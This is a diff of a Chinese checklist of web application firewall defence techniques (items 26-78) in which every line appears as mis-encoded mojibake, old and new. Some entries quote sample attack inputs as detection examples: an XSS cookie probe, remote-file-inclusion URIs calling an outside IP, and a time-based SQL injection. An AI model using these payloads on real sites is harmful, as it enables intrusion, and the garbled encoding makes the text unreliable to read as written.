-µÚ26¼¼ µ÷ÓÃURIºÚ¿â(ÀýÈçURIBL,Google Safe Browsing API)£¬Ê¶±ð¶ñÒâURI
-ÄÔ¶´£ºBAT£¬360£¬½ðÉ½µÈ´óµÄ»¥ÁªÍø¹«Ë¾¶¼Â½Ðø¿ª·ÅÁË×Ô¼ºµÄ¶ñÒâÍøÖ·¿â½Ó¿Ú
+ç¬¬26æŠ€ è°ƒç”¨URIé»‘åº“(ä¾‹å¦‚URIBL,Google Safe Browsing API)ï¼Œè¯†åˆ«æ¶æ„URI
+è„‘æ´žï¼šBATï¼Œ360ï¼Œé‡‘å±±ç­‰å¤§çš„äº’è”ç½‘å…¬å¸éƒ½é™†ç»­å¼€æ”¾äº†è‡ªå·±çš„æ¶æ„ç½‘å€åº“æŽ¥å£
 
-µÚ27¼¼ °´Ðè½âÎöHTTPÇëÇóÌå
-HTTPÇëÇóÌåµÄ¼ì²âÊÇ·Ç³£ÏûºÄÐÔÄÜµÄ£¬ËùÒÔÒª¼ÓÉÏ¸÷ÖÖÓÅ»¯ÏÞÖÆ£¬ÀýÈç¼ì²âÌå³¤¶ÈÏÞÖÆ£¬»º´æµ½±¾µØÎÄ¼þÏµÍ³µÄÇëÇóÌåÊÇ·ñ½âÎö£¨Ïñnaxsi¾Í²»½âÎöÕâÖÖ£©£¬ÊÇ·ñ½âÎöXMLÊµÌåÀàÐÍµÈ
+ç¬¬27æŠ€ æŒ‰éœ€è§£æžHTTPè¯·æ±‚ä½“
+HTTPè¯·æ±‚ä½“çš„æ£€æµ‹æ˜¯éžå¸¸æ¶ˆè€—æ€§èƒ½çš„ï¼Œæ‰€ä»¥è¦åŠ ä¸Šå„ç§ä¼˜åŒ–é™åˆ¶ï¼Œä¾‹å¦‚æ£€æµ‹ä½“é•¿åº¦é™åˆ¶ï¼Œç¼“å­˜åˆ°æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„è¯·æ±‚ä½“æ˜¯å¦è§£æžï¼ˆåƒnaxsiå°±ä¸è§£æžè¿™ç§ï¼‰ï¼Œæ˜¯å¦è§£æžXMLå®žä½“ç±»åž‹ç­‰
 
-µÚ28¼¼ Ê¶±ð²»·ûºÏÐ­Òé¹æ·¶´øÓÐÇ±ÔÚ¶ñÒâµÄÇëÇóÌå
-ÎÞ·¨ÎªÐ­Òé½âÎö×é¼þËù½âÎöµÄÇëÇóÌå¶¼ÓÐ¶ñÒâµÄ¿ÉÄÜÐÔ£¬ÀýÈçÔÚmultipart-formÀàÐÍµÄÎÄ¼þÉÏ´«°üÖÐ¹¹Ôì¶ñÒâ¸ñÊ½ÈÆ¹ýÉÏ´«ÎÄ¼þÀàÐÍµÄÏÞÖÆ
+ç¬¬28æŠ€ è¯†åˆ«ä¸ç¬¦åˆåè®®è§„èŒƒå¸¦æœ‰æ½œåœ¨æ¶æ„çš„è¯·æ±‚ä½“
+æ— æ³•ä¸ºåè®®è§£æžç»„ä»¶æ‰€è§£æžçš„è¯·æ±‚ä½“éƒ½æœ‰æ¶æ„çš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚åœ¨multipart-formç±»åž‹çš„æ–‡ä»¶ä¸Šä¼ åŒ…ä¸­æž„é€ æ¶æ„æ ¼å¼ç»•è¿‡ä¸Šä¼ æ–‡ä»¶ç±»åž‹çš„é™åˆ¶
 
-µÚ29¼¼ ¹æ·¶»¯Unicode±àÂë
-WAFÈÆ¹ý¼¼ÇÉÖÐÓÐÒ»´ó·ÖÖ§£­±àÂëÈÆ¹ý£¬Ê¹ÓÃ±àÂëÓ³Éä¹æ·¶»¯±àÂëÊÇ¸ö²»´íµÄµã×Ó
+ç¬¬29æŠ€ è§„èŒƒåŒ–Unicodeç¼–ç 
+WAFç»•è¿‡æŠ€å·§ä¸­æœ‰ä¸€å¤§åˆ†æ”¯ï¼ç¼–ç ç»•è¿‡ï¼Œä½¿ç”¨ç¼–ç æ˜ å°„è§„èŒƒåŒ–ç¼–ç æ˜¯ä¸ªä¸é”™çš„ç‚¹å­
 
-µÚ30¼¼ Ê¶±ð¶àÖØ±àÂë
-ÀýÈçÁ½´Îurlencode
+ç¬¬30æŠ€ è¯†åˆ«å¤šé‡ç¼–ç 
+ä¾‹å¦‚ä¸¤æ¬¡urlencode
 
-µÚ31¼¼ Ê¶±ðÒì³£±àÂë
-ÑéÖ¤ÊÇ·ñÎª¹æ·¶±àÂë
+ç¬¬31æŠ€ è¯†åˆ«å¼‚å¸¸ç¼–ç 
+éªŒè¯æ˜¯å¦ä¸ºè§„èŒƒç¼–ç 
 
-µÚ32¼¼ Ê¶±ðÒì³£µÄHTTPÇëÇó·½·¨
-ÖÆ¶¨HTTPÇëÇó°×Ãûµ¥£¬ÀýÈçÖ»ÔÊÐíGET¡¢POST¡¢HEAD
+ç¬¬32æŠ€ è¯†åˆ«å¼‚å¸¸çš„HTTPè¯·æ±‚æ–¹æ³•
+åˆ¶å®šHTTPè¯·æ±‚ç™½åå•ï¼Œä¾‹å¦‚åªå…è®¸GETã€POSTã€HEAD
 
-µÚ33¼¼ Ê¶±ð²»·ûºÏRFC 2616¶¨ÒåµÄURI¸ñÊ½
+ç¬¬33æŠ€ è¯†åˆ«ä¸ç¬¦åˆRFC 2616å®šä¹‰çš„URIæ ¼å¼
 
-µÚ34¼¼ Ê¶±ðHTTPÇëÇóÍ·Òì³£
-ÀýÈçHTTPÇëÇóÍ·È±Ê§¡¢ÇëÇóÍ·ÅÅÁÐË³ÐòÒì³£¡¢ÇëÇóÍ·È¡ÖµÒì³£
+ç¬¬34æŠ€ è¯†åˆ«HTTPè¯·æ±‚å¤´å¼‚å¸¸
+ä¾‹å¦‚HTTPè¯·æ±‚å¤´ç¼ºå¤±ã€è¯·æ±‚å¤´æŽ’åˆ—é¡ºåºå¼‚å¸¸ã€è¯·æ±‚å¤´å–å€¼å¼‚å¸¸
 
-µÚ35¼¼ Í¨¹ý¶àÓà²ÎÊýÊ¶±ð¹¥»÷
+ç¬¬35æŠ€ é€šè¿‡å¤šä½™å‚æ•°è¯†åˆ«æ”»å‡»
 
-µÚ36¼¼ Í¨¹ýÈ±Ê§²ÎÊýÊ¶±ð¹¥»÷
+ç¬¬36æŠ€ é€šè¿‡ç¼ºå¤±å‚æ•°è¯†åˆ«æ”»å‡»
 
-µÚ37¼¼ Í¨¹ýÖØ¸´²ÎÊý£¨HPP£©Ê¶±ð¹¥»÷
-ÄÔ¶´£ºÕý³£µÄÓ¦ÓÃÒ²»á³öÏÖÖØ¸´²ÎÊýµÄÇé¿ö£¬why£¡£¡£¡
+ç¬¬37æŠ€ é€šè¿‡é‡å¤å‚æ•°ï¼ˆHPPï¼‰è¯†åˆ«æ”»å‡»
+è„‘æ´žï¼šæ­£å¸¸çš„åº”ç”¨ä¹Ÿä¼šå‡ºçŽ°é‡å¤å‚æ•°çš„æƒ…å†µï¼Œwhyï¼ï¼ï¼
 
-µÚ38¼¼ Í¨¹ý²ÎÊýÈ¡Öµ³¤¶ÈÒì³£Ê¶±ð¹¥»÷
+ç¬¬38æŠ€ é€šè¿‡å‚æ•°å–å€¼é•¿åº¦å¼‚å¸¸è¯†åˆ«æ”»å‡»
 
-µÚ39¼¼ Í¨¹ý²ÎÊýÈ¡Öµ×Ö·ûÀàÐÍÒì³£Ê¶±ð¹¥»÷
-²ÉÈ¡²ÎÊýÈ¡Öµ°×Ãûµ¥µÄ·½Ê½À´·ÀÓù
+ç¬¬39æŠ€ é€šè¿‡å‚æ•°å–å€¼å­—ç¬¦ç±»åž‹å¼‚å¸¸è¯†åˆ«æ”»å‡»
+é‡‡å–å‚æ•°å–å€¼ç™½åå•çš„æ–¹å¼æ¥é˜²å¾¡
 
-µÚ40¼¼ Ê¶±ðHTTPÏìÓ¦Í·Òì³£
-ÀýÈç5xx´íÎóµÄ±ÈÀý£¬HTTPÏìÓ¦²ð·Ö£¬¶ñÒâµÄÖØ¶¨Ïò
+ç¬¬40æŠ€ è¯†åˆ«HTTPå“åº”å¤´å¼‚å¸¸
+ä¾‹å¦‚5xxé”™è¯¯çš„æ¯”ä¾‹ï¼ŒHTTPå“åº”æ‹†åˆ†ï¼Œæ¶æ„çš„é‡å®šå‘
 
-µÚ41¼¼ Ô¤·ÀHTTPÏìÓ¦Í·ÖÐµÄÐÅÏ¢Ð¹Â©
-ÒÆ³ý»òÎ±Ôì·þÎñÇ©ÃûÏìÓ¦Í·£¬ÀýÈçServer,X-Powerd-By,X-AspNet-Version
+ç¬¬41æŠ€ é¢„é˜²HTTPå“åº”å¤´ä¸­çš„ä¿¡æ¯æ³„æ¼
+ç§»é™¤æˆ–ä¼ªé€ æœåŠ¡ç­¾åå“åº”å¤´ï¼Œä¾‹å¦‚Server,X-Powerd-By,X-AspNet-Version
 
-µÚ42¼¼ °´Ðè½âÎöHTTPÏìÓ¦Ìå
-ÏìÓ¦ÌåµÄ¼ì²âÊÇ¼«ÆäÏûºÄÐÔÄÜµÄ£¬ËùÒÔÒª²ÎÕÕ°²È«¼¶±ð½÷É÷ÉèÖÃÈçºÎ½âÎöHTTPÏìÓ¦Ìå
+ç¬¬42æŠ€ æŒ‰éœ€è§£æžHTTPå“åº”ä½“
+å“åº”ä½“çš„æ£€æµ‹æ˜¯æžå…¶æ¶ˆè€—æ€§èƒ½çš„ï¼Œæ‰€ä»¥è¦å‚ç…§å®‰å…¨çº§åˆ«è°¨æ…Žè®¾ç½®å¦‚ä½•è§£æžHTTPå“åº”ä½“
 
-µÚ43¼¼ ¼ì²âÍøÒ³´Û¸Ä-±êÌâ´Û¸Ä
+ç¬¬43æŠ€ æ£€æµ‹ç½‘é¡µç¯¡æ”¹-æ ‡é¢˜ç¯¡æ”¹
 
-µÚ44¼¼ ¼ì²âÍøÒ³´Û¸Ä-ÏìÓ¦Ìå³¤¶ÈÒì³£
-ÍøÒ³ÄÚÈÝ±»´Û¸Ä»òºó¶ËDB±»ÍÏ¿âÊ±£¬ÏìÓ¦ÌåµÄ´óÐ¡»á·¢ÉúÃ÷ÏÔµÄ±ä»¯
-2015-12-11:  ¹ÒÂí²¢²»»á·¢Éú´óµÄ±ä»¯£¬³£¼ûÍÏ¿âÐÐÎªÊÇ·ñ»áÒý·¢Ã÷ÏÔ±ä»¯£¬ÐèÒªÊÔÑéºó¸ø³ö½áÂÛ£¨Ò²ÊÇ¼Ìwebshell¼ì²âºó¼Æ»®ÊÔÑéµÄ£©
+ç¬¬44æŠ€ æ£€æµ‹ç½‘é¡µç¯¡æ”¹-å“åº”ä½“é•¿åº¦å¼‚å¸¸
+ç½‘é¡µå†…å®¹è¢«ç¯¡æ”¹æˆ–åŽç«¯DBè¢«æ‹–åº“æ—¶ï¼Œå“åº”ä½“çš„å¤§å°ä¼šå‘ç”Ÿæ˜Žæ˜¾çš„å˜åŒ–
+2015-12-11:  æŒ‚é©¬å¹¶ä¸ä¼šå‘ç”Ÿå¤§çš„å˜åŒ–ï¼Œå¸¸è§æ‹–åº“è¡Œä¸ºæ˜¯å¦ä¼šå¼•å‘æ˜Žæ˜¾å˜åŒ–ï¼Œéœ€è¦è¯•éªŒåŽç»™å‡ºç»“è®ºï¼ˆä¹Ÿæ˜¯ç»§webshellæ£€æµ‹åŽè®¡åˆ’è¯•éªŒçš„ï¼‰
 
-µÚ45¼¼ ¼ì²âÍøÒ³´Û¸Ä-ÏìÓ¦Ìå¶¯Ì¬ÄÚÈÝ´Û¸Ä
-ÀýÈçÔÚ±íµ¥×¢ÈëÒ»¶Î<script>alert(document.cookie);</script>,¼ì²éÏìÓ¦ÌåÖÐ»á³öÏÖÐÂµÄJS±êÇ©£¬ÎÒÃÇ¸ù¾Ý±êÇ©¸öÊý±ãÄÜ·¢ÏÖ¹¥»÷¡£
+ç¬¬45æŠ€ æ£€æµ‹ç½‘é¡µç¯¡æ”¹-å“åº”ä½“åŠ¨æ€å†…å®¹ç¯¡æ”¹
+ä¾‹å¦‚åœ¨è¡¨å•æ³¨å…¥ä¸€æ®µ<script>alert(document.cookie);</script>,æ£€æŸ¥å“åº”ä½“ä¸­ä¼šå‡ºçŽ°æ–°çš„JSæ ‡ç­¾ï¼Œæˆ‘ä»¬æ ¹æ®æ ‡ç­¾ä¸ªæ•°ä¾¿èƒ½å‘çŽ°æ”»å‡»ã€‚
 
-µÚ46¼¼ ¼ì²âÏìÓ¦ÌåÖÐµÄÔ´ÂëÐ¹Â©
-ÀýÈçphp-cgiÔ´ÂëÐ¹Â©Â©¶´CVE-201201823
+ç¬¬46æŠ€ æ£€æµ‹å“åº”ä½“ä¸­çš„æºç æ³„æ¼
+ä¾‹å¦‚php-cgiæºç æ³„æ¼æ¼æ´žCVE-201201823
 
-µÚ47¼¼ ¼ì²âÏìÓ¦ÌåÖÐµÄÐÅÏ¢Ð¹Â©
-ÀýÈçÏìÓ¦ÌåÖÐÐ¹Â©Ô´Âë¾ø¶ÔÂ·¾¶£¬Êý¾Ý¿âÐÅÏ¢
+ç¬¬47æŠ€ æ£€æµ‹å“åº”ä½“ä¸­çš„ä¿¡æ¯æ³„æ¼
+ä¾‹å¦‚å“åº”ä½“ä¸­æ³„æ¼æºç ç»å¯¹è·¯å¾„ï¼Œæ•°æ®åº“ä¿¡æ¯
 
-µÚ48¼¼ Í¨¹ýÒì³£µÄÏìÓ¦Ê±¼äÀ´·¢ÏÖ¹¥»÷
-ÀýÈç»ùÓÚÊ±¼äµÄSQLÃ¤×¢waitfor delay»áÔì³ÉÒì³£µÄÏìÓ¦Ê±¼ä
+ç¬¬48æŠ€ é€šè¿‡å¼‚å¸¸çš„å“åº”æ—¶é—´æ¥å‘çŽ°æ”»å‡»
+ä¾‹å¦‚åŸºäºŽæ—¶é—´çš„SQLç›²æ³¨waitfor delayä¼šé€ æˆå¼‚å¸¸çš„å“åº”æ—¶é—´
 
-µÚ49¼¼ ¼ì²âÏìÓ¦ÌåÖÐµÄÓÃ»§Êý¾ÝÐ¹Â©
-ÀýÈçÐÅÓÃ¿¨ºÅ
+ç¬¬49æŠ€ æ£€æµ‹å“åº”ä½“ä¸­çš„ç”¨æˆ·æ•°æ®æ³„æ¼
+ä¾‹å¦‚ä¿¡ç”¨å¡å·
 
-µÚ50¼¼ ¼ì²âÄ¾Âí¡¢ºóÃÅ¡¢webshellÁ¬½Ó³¢ÊÔ
+ç¬¬50æŠ€ æ£€æµ‹æœ¨é©¬ã€åŽé—¨ã€webshellè¿žæŽ¥å°è¯•
 
-µÚ51¼¼ ¼à²âÊ¹ÓÃ³£ÓÃÕËºÅ½øÐÐµÄµÇÂ¼³¢ÊÔ
-ÀýÈçÊ¹ÓÃadmin administrator root systemµÈ×÷ÎªÓÃ»§ÃûÀ´³¢ÊÔµÇÂ¼
+ç¬¬51æŠ€ ç›‘æµ‹ä½¿ç”¨å¸¸ç”¨è´¦å·è¿›è¡Œçš„ç™»å½•å°è¯•
+ä¾‹å¦‚ä½¿ç”¨admin administrator root systemç­‰ä½œä¸ºç”¨æˆ·åæ¥å°è¯•ç™»å½•
 
-µÚ52¼¼ ¼à²âµÇÂ¼¿ÚºáÏò±©Á¦ÆÆ½â
-Ê¹ÓÃÍ¬Ò»¸öÃÜÂë£¬²»Í¬µÄÓÃ»§ÃûÀ´³¢ÊÔ±©Á¦ÆÆ½â
+ç¬¬52æŠ€ ç›‘æµ‹ç™»å½•å£æ¨ªå‘æš´åŠ›ç ´è§£
+ä½¿ç”¨åŒä¸€ä¸ªå¯†ç ï¼Œä¸åŒçš„ç”¨æˆ·åæ¥å°è¯•æš´åŠ›ç ´è§£
 
-µÚ53¼¼ ¼à²âÊ§°ÜµÄµÇÂ¼³¢ÊÔ
+ç¬¬53æŠ€ ç›‘æµ‹å¤±è´¥çš„ç™»å½•å°è¯•
 
-µÚ54¼¼ ¼à²â¸ßÆµÂÊµÄµÇÂ¼³¢ÊÔ
+ç¬¬54æŠ€ ç›‘æµ‹é«˜é¢‘çŽ‡çš„ç™»å½•å°è¯•
 
-µÚ55¼¼ Ê¹ÓÃÍ³Ò»µÄµÇÂ¼Ê§°ÜÌáÊ¾£¬±ÜÃâÓÐÓÃÐÅÏ¢Ð¹Â©
-Ïñ´íÎóµÄÓÃ»§Ãû»ò´íÎóµÄÃÜÂëÕâÖÖÌáÊ¾»á¸ø±©Á¦ÆÆ½âÌá¹©ÓÐÐ§ÐÅÏ¢
+ç¬¬55æŠ€ ä½¿ç”¨ç»Ÿä¸€çš„ç™»å½•å¤±è´¥æç¤ºï¼Œé¿å…æœ‰ç”¨ä¿¡æ¯æ³„æ¼
+åƒé”™è¯¯çš„ç”¨æˆ·åæˆ–é”™è¯¯çš„å¯†ç è¿™ç§æç¤ºä¼šç»™æš´åŠ›ç ´è§£æä¾›æœ‰æ•ˆä¿¡æ¯
 
-µÚ56¼¼ ÆôÓÃÃÜÂë¸´ÔÓ¶È¼ì²â
+ç¬¬56æŠ€ å¯ç”¨å¯†ç å¤æ‚åº¦æ£€æµ‹
 
-µÚ57¼¼ ·ÖÎöÒ»¸ö»á»°ÆÚ£¬µÇÂ¼³¢ÊÔµÄÓÃ»§ÃûÀ´·¢ÏÖµÇÂ¼¿ÚÒì³£
+ç¬¬57æŠ€ åˆ†æžä¸€ä¸ªä¼šè¯æœŸï¼Œç™»å½•å°è¯•çš„ç”¨æˆ·åæ¥å‘çŽ°ç™»å½•å£å¼‚å¸¸
 
-µÚ58¼¼ ¼ì²âÒì³£µÄcookieÈ¡Öµ
-»ùÓÚ»á»°µÄ¹¥»÷£¬°üÀ¨¿É²Â²âµÄ»á»°IDÈ¡Öµ£¨burpsuite¾Í¼¯³ÉÁË»á»°sequence·ÖÎö¹¤¾ß£©
+ç¬¬58æŠ€ æ£€æµ‹å¼‚å¸¸çš„cookieå–å€¼
+åŸºäºŽä¼šè¯çš„æ”»å‡»ï¼ŒåŒ…æ‹¬å¯çŒœæµ‹çš„ä¼šè¯IDå–å€¼ï¼ˆburpsuiteå°±é›†æˆäº†ä¼šè¯sequenceåˆ†æžå·¥å…·ï¼‰
 
-µÚ59¼¼ ¼ì²âÀ´×Ôcookie×Ö¶ÎµÄ¹¥»÷
-ÀýÈçcookie×Ö¶ÎµÄSQL×¢Èë
+ç¬¬59æŠ€ æ£€æµ‹æ¥è‡ªcookieå­—æ®µçš„æ”»å‡»
+ä¾‹å¦‚cookieå­—æ®µçš„SQLæ³¨å…¥
 
-µÚ60¼¼ ÉèÖÃ»á»°ÓÐÐ§ÆÚ
-·ÀÓù»á»°¹Ì¶¨¹¥»÷
+ç¬¬60æŠ€ è®¾ç½®ä¼šè¯æœ‰æ•ˆæœŸ
+é˜²å¾¡ä¼šè¯å›ºå®šæ”»å‡»
 
-µÚ61¼¼ ¼ì²âÒ»¸ö»á»°ÆÚ£¬ÇëÇóÕßIPµÄGEOÐÅÏ¢µÄ±ä»¯
+ç¬¬61æŠ€ æ£€æµ‹ä¸€ä¸ªä¼šè¯æœŸï¼Œè¯·æ±‚è€…IPçš„GEOä¿¡æ¯çš„å˜åŒ–
 
-µÚ62¼¼ ¼ì²âÒ»¸ö»á»°ÆÚ£¬ÇëÇóÕßÖ¸ÎÆµÄ±ä»¯
-¸Ã¼¼ÊõÒ»°ãÓÃÓÚ·´ÆÛÕ©ÏµÍ³ÓÃÓÚÊ¶±ðÓÃ»§Éí·Ý£¬°üÀ¨·ÃÎÊÕßÆÁÄ»´óÐ¡£¬Ê±Çø£¬ÓïÑÔÉèÖÃ£¬ä¯ÀÀÆ÷²å¼þ
+ç¬¬62æŠ€ æ£€æµ‹ä¸€ä¸ªä¼šè¯æœŸï¼Œè¯·æ±‚è€…æŒ‡çº¹çš„å˜åŒ–
+è¯¥æŠ€æœ¯ä¸€èˆ¬ç”¨äºŽåæ¬ºè¯ˆç³»ç»Ÿç”¨äºŽè¯†åˆ«ç”¨æˆ·èº«ä»½ï¼ŒåŒ…æ‹¬è®¿é—®è€…å±å¹•å¤§å°ï¼Œæ—¶åŒºï¼Œè¯­è¨€è®¾ç½®ï¼Œæµè§ˆå™¨æ’ä»¶
 
-µÚ63¼¼ ¼ì²âÇëÇóÕßÖÐµÄ·ÇASCII×Ö·û
-ÀýÈçNULL×Ö·û%00
-ÄÔ¶´£º¿´¹ýnaxsi»ù´¡¹æÔòÎÄ¼þµÄ»á·¢ÏÖ£¬90%µÄ¹æÔò¶¼ÊÇ¼ì²â·ÇASCII×Ö·û
+ç¬¬63æŠ€ æ£€æµ‹è¯·æ±‚è€…ä¸­çš„éžASCIIå­—ç¬¦
+ä¾‹å¦‚NULLå­—ç¬¦%00
+è„‘æ´žï¼šçœ‹è¿‡naxsiåŸºç¡€è§„åˆ™æ–‡ä»¶çš„ä¼šå‘çŽ°ï¼Œ90%çš„è§„åˆ™éƒ½æ˜¯æ£€æµ‹éžASCIIå­—ç¬¦
 
-µÚ64¼¼ ¼ì²âÄ¿Â¼±éÀú¹¥»÷
-2015-12-11:  ²ÂºóÌ¨Ä¿Â¼£¯Â©¶´pathÊÇ±È½ÏÓÐÐ§µÄÉøÍ¸·½·¨
+ç¬¬64æŠ€ æ£€æµ‹ç›®å½•éåŽ†æ”»å‡»
+2015-12-11:  çŒœåŽå°ç›®å½•ï¼æ¼æ´žpathæ˜¯æ¯”è¾ƒæœ‰æ•ˆçš„æ¸—é€æ–¹æ³•
 
-µÚ65¼¼  ¼ì²â·ÇÕý³£Á÷³ÌµÄÍøÕ¾×ÊÔ´·ÃÎÊ
-¿ØÖÆURL½øÐÐºáÏòÈ¨ÏÞÌáÉý£¬×ÝÏòÈ¨ÏÞÌáÉý²Ù×÷
-¿ÉÒÔÊ¹ÓÃ¼ÓÃÜtoken£¨ÀýÈçurl hash£©À´·ÀÓùÈÎÒâ×ÊÔ´·ÃÎÊ£¬ÈçÏÂËùÊ¾
+ç¬¬65æŠ€  æ£€æµ‹éžæ­£å¸¸æµç¨‹çš„ç½‘ç«™èµ„æºè®¿é—®
+æŽ§åˆ¶URLè¿›è¡Œæ¨ªå‘æƒé™æå‡ï¼Œçºµå‘æƒé™æå‡æ“ä½œ
+å¯ä»¥ä½¿ç”¨åŠ å¯†tokenï¼ˆä¾‹å¦‚url hashï¼‰æ¥é˜²å¾¡ä»»æ„èµ„æºè®¿é—®ï¼Œå¦‚ä¸‹æ‰€ç¤º
 https://www.REDACTED.com/Cust/cust_5.php/222557/20040216?rv_token=abfb508403bbf7d78c3f8de1735d49f01b90eb71
 
 
-µÚ66¼¼ ¼ì²âSQL×¢Èë¹¥»÷
-SQL×¢ÈëµÄ·ÀÓù·½·¨Ò»°ãÓÐÈýÖÖ
-£¨1£©SQL¹Ø¼ü×Ö¹ýÂËÆ÷ £¨2£©SQLÓïÒå·ÖÎö £¨3£©ÆÓËØ±´Ò¶Ë¹Òì³£·ÖÀà£¨Ê¹ÓÃ»úÆ÷Ñ§Ï°Ëã·¨µÄÒì³£¼ì²â£©
+ç¬¬66æŠ€ æ£€æµ‹SQLæ³¨å…¥æ”»å‡»
+SQLæ³¨å…¥çš„é˜²å¾¡æ–¹æ³•ä¸€èˆ¬æœ‰ä¸‰ç§
+ï¼ˆ1ï¼‰SQLå…³é”®å­—è¿‡æ»¤å™¨ ï¼ˆ2ï¼‰SQLè¯­ä¹‰åˆ†æž ï¼ˆ3ï¼‰æœ´ç´ è´å¶æ–¯å¼‚å¸¸åˆ†ç±»ï¼ˆä½¿ç”¨æœºå™¨å­¦ä¹ ç®—æ³•çš„å¼‚å¸¸æ£€æµ‹ï¼‰
 2015-12-11:  
 
-µÚ67¼¼ ¼ì²âÔ¶³ÌÎÄ¼þ°üº¬Â©¶´
-µ±URI°üº¬ÒÔÏÂÇé¿öÊ±£¬¼«¿ÉÄÜÊÇÒ»´Î¹¥»÷ÇëÇó
-IPµØÖ·£¬ÀýÈç/a.php?libdir=http://89.238.174.14/fx.txt???
-PHPº¯Êý£¬ÀýÈç/?id={${include("http://xxx.xx.xx/fx.txt??)}}
-¶à¸ö£¿ºÅ£¬ÀýÈç/a.php?libdir=http://xxx.xx.xx/cgi???
-°üº¬µÄhostÓëHostÍ·µÄ×Ö¶Î²»·û£¬ÀýÈç/a.php?libdir=http://www.example.com
+ç¬¬67æŠ€ æ£€æµ‹è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ž
+å½“URIåŒ…å«ä»¥ä¸‹æƒ…å†µæ—¶ï¼Œæžå¯èƒ½æ˜¯ä¸€æ¬¡æ”»å‡»è¯·æ±‚
+IPåœ°å€ï¼Œä¾‹å¦‚/a.php?libdir=http://89.238.174.14/fx.txt???
+PHPå‡½æ•°ï¼Œä¾‹å¦‚/?id={${include("http://xxx.xx.xx/fx.txt??)}}
+å¤šä¸ªï¼Ÿå·ï¼Œä¾‹å¦‚/a.php?libdir=http://xxx.xx.xx/cgi???
+åŒ…å«çš„hostä¸ŽHostå¤´çš„å­—æ®µä¸ç¬¦ï¼Œä¾‹å¦‚/a.php?libdir=http://www.example.com
 
-µÚ68¼¼ ¼ì²â²Ù×÷ÏµÍ³ÃüÁîÖ´ÐÐÂ©¶´
+ç¬¬68æŠ€ æ£€æµ‹æ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´ž
 
-µÚ69¼¼ ¼ì²âHTTP Request Smuggling HRS¹¥»÷
+ç¬¬69æŠ€ æ£€æµ‹HTTP Request Smuggling HRSæ”»å‡»
 
-µÚ70¼¼ ¼ì²âHTTPÏìÓ¦²ð·ÖÂ©¶´
+ç¬¬70æŠ€ æ£€æµ‹HTTPå“åº”æ‹†åˆ†æ¼æ´ž
 
-µÚ71¼¼ ¼ì²âXML¹¥»÷
-ÀýÈçXPath×¢Èë
+ç¬¬71æŠ€ æ£€æµ‹XMLæ”»å‡»
+ä¾‹å¦‚XPathæ³¨å…¥
 
-µÚ72¼¼ Ê¹ÓÃCSP²ßÂÔ·ÀÓù
+ç¬¬72æŠ€ ä½¿ç”¨CSPç­–ç•¥é˜²å¾¡
 
-µÚ73¼¼ ¼ì²âXSS¹¥»÷
-XSSµÄ·ÀÓù·½·¨Ò»°ãÓÐÈýÖÖ
-£¨1£©XSS¹Ø¼ü×Ö¹ýÂËÆ÷ £¨2£©X-XSS-PROTECTION £¨3£©javascriptÉ³ºÐ
+ç¬¬73æŠ€ æ£€æµ‹XSSæ”»å‡»
+XSSçš„é˜²å¾¡æ–¹æ³•ä¸€èˆ¬æœ‰ä¸‰ç§
+ï¼ˆ1ï¼‰XSSå…³é”®å­—è¿‡æ»¤å™¨ ï¼ˆ2ï¼‰X-XSS-PROTECTION ï¼ˆ3ï¼‰javascriptæ²™ç›’
 
-µÚ74¼¼ ¼ì²âCRSF¹¥»÷
-CSRF·ÀÓù·½·¨£º¼ÓÃÜtoken
+ç¬¬74æŠ€ æ£€æµ‹CRSFæ”»å‡»
+CSRFé˜²å¾¡æ–¹æ³•ï¼šåŠ å¯†token
 
-µÚ75¼¼ ·ÀÓùUI Redressing(clickjacking)
-clickjacking·ÀÓù·½·¨£º
-£¨1£©X-Frame-Options£¨2£©frame-busting javascript
+ç¬¬75æŠ€ é˜²å¾¡UI Redressing(clickjacking)
+clickjackingé˜²å¾¡æ–¹æ³•ï¼š
+ï¼ˆ1ï¼‰X-Frame-Optionsï¼ˆ2ï¼‰frame-busting javascript
 
-µÚ76¼¼ ·ÀÓùµÁºÅÄ¾Âí£­ÖÐ¼äÈË¹¥»÷
-µÁºÅÄ¾ÂíÒ»°ã»á½Ø»ñHTTPÇëÇó£¬Î±ÔìµÇÂ¼½çÃæÀ´µÁÈ¡ÕËºÅ£¬¶ø¶ÔÕâÖÖµöÓã¹¥»÷µÄ·ÀÓùÁé¸ÐÀ´Ô´ÓÚÎÄ¼þÍêÕûÐÔ¼ì²â¹¤¾ßtripwires£¬Ê¹ÓÃJS×¢ÈëÏìÓ¦Ìåmd5Öµ¸½¼ÓÔÚµÇÂ¼Ò³ÃæÀ´ÑéÖ¤Ò³ÃæÍêÕûÐÔ¡£
+ç¬¬76æŠ€ é˜²å¾¡ç›—å·æœ¨é©¬ï¼ä¸­é—´äººæ”»å‡»
+ç›—å·æœ¨é©¬ä¸€èˆ¬ä¼šæˆªèŽ·HTTPè¯·æ±‚ï¼Œä¼ªé€ ç™»å½•ç•Œé¢æ¥ç›—å–è´¦å·ï¼Œè€Œå¯¹è¿™ç§é’“é±¼æ”»å‡»çš„é˜²å¾¡çµæ„Ÿæ¥æºäºŽæ–‡ä»¶å®Œæ•´æ€§æ£€æµ‹å·¥å…·tripwiresï¼Œä½¿ç”¨JSæ³¨å…¥å“åº”ä½“md5å€¼é™„åŠ åœ¨ç™»å½•é¡µé¢æ¥éªŒè¯é¡µé¢å®Œæ•´æ€§ã€‚
 
-µÚ77¼¼ ÏÞÖÆÉÏ´«ÎÄ¼þµÄ´óÐ¡£¬±ÜÃâ³¬´óÎÄ¼þÉÏ´«Ôì³É·þÎñÆ÷µÄ¾Ü¾ø·þÎñ¹¥»÷
+ç¬¬77æŠ€ é™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œé¿å…è¶…å¤§æ–‡ä»¶ä¸Šä¼ é€ æˆæœåŠ¡å™¨çš„æ‹’ç»æœåŠ¡æ”»å‡»
 
-µÚ78¼¼ ÏÞÖÆÉÏ´«ÎÄ¼þµÄÊýÄ¿£¬±ÜÃâ¹ý¶àÎÄ¼þÉÏ´«Ôì³É·þÎñÆ÷µÄ¾Ü¾ø·þÎñ¹¥»÷
+ç¬¬78æŠ€ é™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„æ•°ç›®ï¼Œé¿å…è¿‡å¤šæ–‡ä»¶ä¸Šä¼ é€ æˆæœåŠ¡å™¨çš„æ‹’ç»æœåŠ¡æ”»å‡»
 
